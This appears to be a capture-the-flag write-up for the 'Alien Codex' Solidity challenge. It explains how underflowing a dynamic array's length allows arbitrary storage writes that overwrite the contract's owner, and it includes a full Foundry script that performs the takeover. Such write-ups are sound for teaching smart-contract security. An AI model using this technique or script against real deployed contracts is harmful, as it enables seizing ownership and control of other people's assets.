# Alien Codex   
The objective of this challenge is to become the `owner` of the `AlienCodex` contract. Let’s break down the problem and the solution step by step.

#### Initial Observations

1. Solidity Version: The contract uses Solidity version `^0.5.0`, which has some quirks compared to newer versions.
2. Inheritance: The contract inherits from `Ownable`, which means it has an `_owner` variable, even though it’s not explicitly declared in `AlienCodex`.
3. Storage Layout: The contract has two state variables: 
```solidity
contract AlienCodex is Ownable {
    bool public contact; // Slot 0
    bytes32[] public codex; // Slot 1 (length), data starts at keccak256(abi.encodePacked(uint256(1)))
...
}
```
The key to solving this challenge lies in exploiting the dynamic array `codex`. Since Solidity stores dynamic arrays differently from fixed-size arrays, we can manipulate the array’s length and data to overwrite storage slots, including the `_owner` variable.
Steps to Exploit:
1. Enable Contact: Call `makeContact()` to set contact to `true`, allowing us to interact with other functions.
2. Underflow the Array Length: Call `retract()` to decrease the `codex.length` by 1. Since codex is initially empty, this causes an underflow, setting the length to 2^256 - 1. This effectively gives us access to the entire storage space of the contract.
3. Calculate the Target Index: The `_owner` variable is stored at Slot 0. To overwrite it, we need to calculate the index in the `codex` array that corresponds to Slot 0. The formula for the index is:
```solidity
index = 2^256 - uint256(keccak256(abi.encodePacked(uint256(1))))
```
This is because the array data starts at `keccak256(abi.encodePacked(uint256(1)))` (Slot 1’s hash).
4. Overwrite the Owner: Use the `revise()` function to write our address to the calculated index, effectively overwriting the `_owner` variable.

I wrote a script to automate the exploitation process:
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract SolvingScript is Script {
    address victim = ; // Your instance address

    function run() external {
        vm.startBroadcast();
        victim.call(abi.encodeWithSignature("makeContact()"));
        victim.call(abi.encodeWithSignature("retract()"));
        vm.stopBroadcast();

        uint256 index;
        unchecked {
            index -= uint256((keccak256(abi.encodePacked(uint256(1)))));
        }

        vm.startBroadcast();
        victim.call(abi.encodeWithSignature("revise(uint256,bytes32)", index, bytes32(uint256(uint160(msg.sender)))));
        vm.stopBroadcast();
    }
}
```